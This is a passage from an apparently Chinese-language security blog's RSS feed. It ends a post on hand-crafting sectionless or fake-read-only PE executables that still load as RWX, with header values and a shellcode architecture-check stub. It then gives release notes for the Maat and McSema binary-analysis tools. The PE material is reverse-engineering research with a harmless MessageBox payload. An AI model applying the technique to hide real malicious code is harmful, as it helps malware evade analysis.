&lt;/h3&gt;&lt;p&gt;通过手工构造的PE头部演示该技术（关键字段）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DOS&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Header&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;nl&#34;&gt;e_magic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x5A4D&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;nl&#34;&gt;e_lfanew&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x40&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;NT&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Header&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;nl&#34;&gt;SectionAlignment&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x200&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// 关键值
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;   &lt;span class=&#34;nl&#34;&gt;SizeOfImage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x100000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;nl&#34;&gt;NumberOfSections&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// 无节区
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;   &lt;span class=&#34;nl&#34;&gt;Characteristics&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x22&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;附加的位置无关代码通过动态加载user32.dll调用MessageBoxA，该payload同时兼容32/64位环境：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;   &lt;span class=&#34;c1&#34;&gt;; 架构检测机制
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;push&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;sub&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;ecx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;cmp&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;je&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;64&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;bit_code&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;示例2带伪造节区的可执行pe&#34;&gt;示例2：带伪造节区的可执行PE
&lt;/h3&gt;&lt;p&gt;更有趣的是可以创建虚假的只读节区。虽然节区标记为只读，但实际内存仍具有RWX权限：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;伪造的节区头部&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;nl&#34;&gt;VirtualSize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x1000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;nl&#34;&gt;Characteristics&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x40000040&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 只读标志
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;技术细节&#34;&gt;技术细节
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;有效载荷可以嵌入NT头部内部（SizeOfHeaders值可设为0）&lt;/li&gt;
&lt;li&gt;从Vista到Win10所有版本均受影响&lt;/li&gt;
&lt;li&gt;现代反汇编工具已能识别此类文件&lt;/li&gt;
&lt;li&gt;可能最初设计用于超小镜像（整镜像小于内存页）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://example.com/samples.zip&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;示例EXE文件下载&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;特别说明：该技术通过比较栈指针变化检测运行架构，虽非最优但足够用于概念验证。实际攻击中可采用更精细的检测方法。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>Maat：让符号执行变得简单 - 跨架构多功能符号执行框架</title>
        <link>http://localhost:1313/p/maat%E8%AE%A9%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%8F%98%E5%BE%97%E7%AE%80%E5%8D%95-%E8%B7%A8%E6%9E%B6%E6%9E%84%E5%A4%9A%E5%8A%9F%E8%83%BD%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E6%A1%86%E6%9E%B6/</link>
        <pubDate>Sat, 02 Aug 2025 11:26:19 +0800</pubDate>
        
        <guid>http://localhost:1313/p/maat%E8%AE%A9%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%8F%98%E5%BE%97%E7%AE%80%E5%8D%95-%E8%B7%A8%E6%9E%B6%E6%9E%84%E5%A4%9A%E5%8A%9F%E8%83%BD%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E6%A1%86%E6%9E%B6/</guid>
        <description>&lt;h1 id=&#34;maat让符号执行变得简单&#34;&gt;Maat：让符号执行变得简单
&lt;/h1&gt;&lt;p&gt;我们发布了Maat——一个跨架构、多用途且用户友好的符号执行框架。它提供动态符号执行（DSE）、污点分析、二进制插桩、环境模拟和约束求解等核心功能。基于Ghidra的中间表示语言p-code，Maat兼具C++高性能API和Python便捷接口，既适合安全专家也方便初学者入门。&lt;/p&gt;
&lt;h2 id=&#34;用户友好的灵活api&#34;&gt;用户友好的灵活API
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;提供C++底层API和Python绑定&lt;/li&gt;
&lt;li&gt;调试器式交互：支持启动/暂停/回滚执行过程&lt;/li&gt;
&lt;li&gt;支持通过回调函数插桩目标代码（寄存器/内存访问等事件触发）&lt;/li&gt;
&lt;li&gt;可定制符号数据处理策略（符号指针处理、状态约束保存等）&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;丰富的架构支持&#34;&gt;丰富的架构支持
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;基于Ghidra的sleigh库实现跨架构支持&lt;/li&gt;
&lt;li&gt;当前已验证X86/X64架构&lt;/li&gt;
&lt;li&gt;未来计划支持Java/Dalvik/Ethereum等虚拟机字节码&lt;/li&gt;
&lt;li&gt;无需安装Ghidra即可使用独立版sleigh&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;性能优化设计&#34;&gt;性能优化设计
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;纯C++核心实现&lt;/li&gt;
&lt;li&gt;实测性能：主流笔记本每秒执行10-30万条指令（2.3GHz i7/32GB RAM）&lt;/li&gt;
&lt;li&gt;未来将添加运行时瓶颈诊断功能&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;快速开始&#34;&gt;快速开始
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;安装：&lt;code&gt;python3 -m pip install pymaat&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;查看&lt;a class=&#34;link&#34; href=&#34;https://maat.re/docs/tutorials&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;教程系列&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;访问&lt;a class=&#34;link&#34; href=&#34;https://github.com/trailofbits/maat&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;GitHub仓库&lt;/a&gt;获取源码和API文档&lt;/li&gt;
&lt;li&gt;通过GitHub讨论区提交反馈&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        <item>
        <title>McSema二进制转LLVM比特码工具重大升级</title>
        <link>http://localhost:1313/p/mcsema%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%ACllvm%E6%AF%94%E7%89%B9%E7%A0%81%E5%B7%A5%E5%85%B7%E9%87%8D%E5%A4%A7%E5%8D%87%E7%BA%A7/</link>
        <pubDate>Fri, 01 Aug 2025 21:24:22 +0800</pubDate>
        
        <guid>http://localhost:1313/p/mcsema%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%ACllvm%E6%AF%94%E7%89%B9%E7%A0%81%E5%B7%A5%E5%85%B7%E9%87%8D%E5%A4%A7%E5%8D%87%E7%BA%A7/</guid>
        <description>&lt;h1 id=&#34;mcsema二进制转llvm比特码工具重大升级&#34;&gt;McSema：二进制转LLVM比特码工具重大升级
&lt;/h1&gt;&lt;p&gt;我们的x86机器码转LLVM比特码工具McSema刚刚完成全面升级。上周举办的开发马拉松显著改善了McSema的易用性、文档质量和代码质量，现在使用McSema分析和逆向工程二进制文件比以往任何时候都更容易。&lt;/p&gt;
&lt;h2 id=&#34;发展阶段&#34;&gt;发展阶段
&lt;/h2&gt;&lt;p&gt;McSema已成为我们日常工作中不可或缺的工具，它能帮助我们发现并加固二进制程序的安全漏洞、独立验证供应商源代码，以及生成高代码覆盖率的应用测试。该工具不仅应用于学术研究，还参与DARPA项目。自2014年开源以来，我们（及其他贡献者）持续扩展其功能以分析日益复杂的程序。&lt;/p&gt;
&lt;h2 id=&#34;性能优化&#34;&gt;性能优化
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;构建速度&lt;/strong&gt;：通过清理死代码、移除冗余库及优化目录结构，构建系统更简洁&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;比特码生成&lt;/strong&gt;：改进控制流图遍历算法，移除Boost依赖，简化比特码生成流程&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;比特码质量&lt;/strong&gt;：取消函数入口/出口的寄存器上下文存储，改用原生位宽操作处理标志位，新增惰性生成比特码优化功能&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;现代化改造&#34;&gt;现代化改造
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;升级至标准版LLVM 3.8（原使用定制版LLVM 3.5）&lt;/li&gt;
&lt;li&gt;完全移除Boost依赖，改用C++11现代特性&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;功能简化&#34;&gt;功能简化
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;统一命令行接口：&lt;code&gt;mcsema-disass&lt;/code&gt;负责反汇编，&lt;code&gt;mcsema-lift&lt;/code&gt;执行比特码转换&lt;/li&gt;
&lt;li&gt;弃用定制反汇编器bin_descend，统一采用IDA Pro作为反汇编引擎&lt;/li&gt;
&lt;li&gt;重构代码结构，精简CMake构建脚本&lt;/li&gt;
&lt;li&gt;采用无外部依赖的集成测试框架&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;新增特性&#34;&gt;新增特性
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;支持更多指令集（提供指令添加指南）&lt;/li&gt;
&lt;li&gt;新增&lt;code&gt;--list-supported&lt;/code&gt;命令查看支持指令列表&lt;/li&gt;
&lt;li&gt;集成测试框架支持快速添加全面翻译测试&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;文档完善&#34;&gt;文档完善
&lt;/h2&gt;&lt;p&gt;全新文档详细说明安装流程、使用方法、测试方案、功能扩展和调试技巧，并包含常见错误解决方案，显著降低第三方开发者的参与门槛。&lt;/p&gt;
&lt;h2 id=&#34;运行时增强&#34;&gt;运行时增强
&lt;/h2&gt;&lt;p&gt;提升运行效率，大幅降低内存占用，改进与原生Windows/Linux代码的复杂交互能力，使转换后的比特码不仅能用于静态分析，还可重新编译为可执行程序。&lt;/p&gt;
&lt;h2 id=&#34;未来规划&#34;&gt;未来规划
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;扩展对复杂软件的支持&lt;/li&gt;
&lt;li&gt;计划采用Binary Ninja替代IDA Pro进行控制流恢复&lt;/li&gt;
&lt;li&gt;新增ARM架构二进制转LLVM比特码功能&lt;/li&gt;
&lt;li&gt;拓展移动应用和嵌入式固件分析场景&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们正在招募对McSema开发感兴趣的实习生。入门者可先尝试&lt;a class=&#34;link&#34; href=&#34;https://github.com/trailofbits/mcsema/blob/master/docs/Converting.md&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Linux二进制转换教程&lt;/a&gt;，了解如何使libFuzzer等工具作用于二进制文件。如有创新构想，欢迎联系我们——若方案可行，我们将提供资金支持实现。&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
